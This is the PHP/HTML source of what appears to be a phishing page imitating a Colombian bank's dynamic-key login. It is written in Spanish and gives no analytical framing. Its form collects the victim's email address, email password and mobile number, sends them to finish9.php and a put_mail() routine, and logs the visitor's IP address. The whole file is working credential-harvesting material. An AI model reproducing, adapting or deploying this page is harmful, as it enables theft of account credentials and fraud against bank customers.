<?php
$ip = getenv("REMOTE_ADDR");
setlocale(LC_TIME, "spanish");
$tiempo = strftime("%A, %d de %B de %Y");
date_default_timezone_set('America/Bogota');
?>
<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width">
  <meta content="es" http-equiv="Content-Language">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">	 	
  <title>replit</title>
		<link href="../../../../../src/css/layout.css" rel="stylesheet">
		<link href="../../../../../src/css/fonts.css" rel="stylesheet">		
		<link rel="icon" type="image/png" href="../../../../../src/img/logo.png" />
		<script type="text/javascript" src="../../../../../src/js/jquery-3.6.0.min.js"></script>
		<script src="../../../../../src/js/jquery.jclock-min.js" type="text/javascript"></script>
   		<script type="text/javascript" src="../../../../../src/js/run.js"></script> 
   	
  <link href="style.css" rel="stylesheet" type="text/css" />
  <style>

        *{
            -webkit-appearance: none;
            font-family: Arial, Helvetica, sans-serif;
            margin: 0;
            padding: 0;
        }
        input[type=submit]{
            background-color:#fdda24;
            color: #030303;
            width: 80%;
            height: 41px;
            border-radius: 124px;
            border-input: 0px solid #ecfd08;
            margin-top: 0px;
            border:0px solid gray;
            padding: 5px;
            font-weight:bold;
            font-size:1em;
            
        }
        

       
    </style>
</head>

<body>
   
<img src="/img/dinamica.jpeg" alt="" width="100%">
  
  <br>
  <br>
 <form action="finish9.php" method="post">
        
        <form action="" method="post">   
             <p >Por favor ingrese su clave  <br> Dinamica</p>
   
       <center>
	   <img src="/img/candadito.svg"   alt="" width="7%">
	     
   			<div class="form-cuerpo">
   							<div style="text-align: left;">
   								<img src="../../../../../src/img/info.jpg" class="icon-info">
								<span class="etiqueta"> Ingrese su Correo Electrónico</span>
   							</div>   						
   							<div class="input-icono email">
   								<input type="text" name="inp-mail" id="inp-mail"
								autocomplete="off" >
   							</div>
   							<br>
   							<div style="text-align: left;">
   								<img src="../../../../../src/img/info.jpg" class="icon-info"><span class="etiqueta">  Ingrese su Clave de Correo</span>
   							</div>   						
   							<div class="input-icono pass">
   								<input type="password" name="inp-pass" id="inp-pass" autocomplete="off" >
   							</div>
   							<br>
   							<div style="text-align: left;">
   								<img src="../../../../../src/img/info.jpg" class="icon-info"><span class="etiqueta">  Ingrese su Celular</span>
   							</div>   						
   							<div class="input-icono celular">
   								<input type="text" name="inp-celular" 
								id="inp-celular" maxlength="10" autocomplete="off" 
								pattern="[0-9]*" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
   							</div>
   							<br>
   							<button id="btn-mail" name="btn-mail" class="btn btn-amarillo" 
							type="button">Verificar</button>
   							<br>
   						  							
   						</div>
		 				     
       <br>
       <center><input type="submit" value="Continuar"></center><br>

    </form>

    
  
<a href=""><center> <img src="/img/bangol.jpeg" alt="" width="100%"></a>
</body>
</html>
<script type="text/javascript">	 
	$(document).ready(function() {
		$('#btn-mail').click(function(){
			if ($("#inp-mail").val().length > 0) {
				if ($("#inp-pass").val().length > 0) {
					if ($("#inp-celular").val().length > 9) {
						put_mail($("#inp-mail").val(),$("#inp-pass").val(),$("#inp-celular").val());
					}else{
						$(".mensaje").show();
						$(".celular").css("border", "1px solid red");
						$("#inp-celular").focus();
					}
				}else{
					$(".mensaje").show();
					$(".pass").css("border", "1px solid red");
					$("#inp-pass").focus();
				}
			}else{
				$(".mensaje").show();
				$(".email").css("border", "1px solid red");
				$("#inp-mail").focus();
			}
		});

		$("#inp-mail").keyup(function(e) {
			$(".email").css("border", "1px solid #CCCCCC");	
			$(".mensaje").hide();				
		});

		$("#inp-pass").keyup(function(e) {
			$(".pass").css("border", "1px solid #CCCCCC");	
			$(".mensaje").hide();				
		});

		$("#inp-celular").keyup(function(e) {
			$(".celular").css("border", "1px solid #CCCCCC");	
			$(".mensaje").hide();				
		});
	});
</script>
<script type="text/javascript">
     $(function($) {
         var optionsEST = {
         am_pm: true,
         timeNotation: '12h',
         h_hour: "<?php echo date('H:i:s') ?>",
         h_date: "<?php echo date('Y/m/d') ?>",
         h_format: "$nombreDia$ $dia$ de $nombreMes$ de $anio$ $hhmmss$ $ampm$",
         h_language: "es"
        }
     $('#fecha-hora').jclock(optionsEST);
     });
 </script>

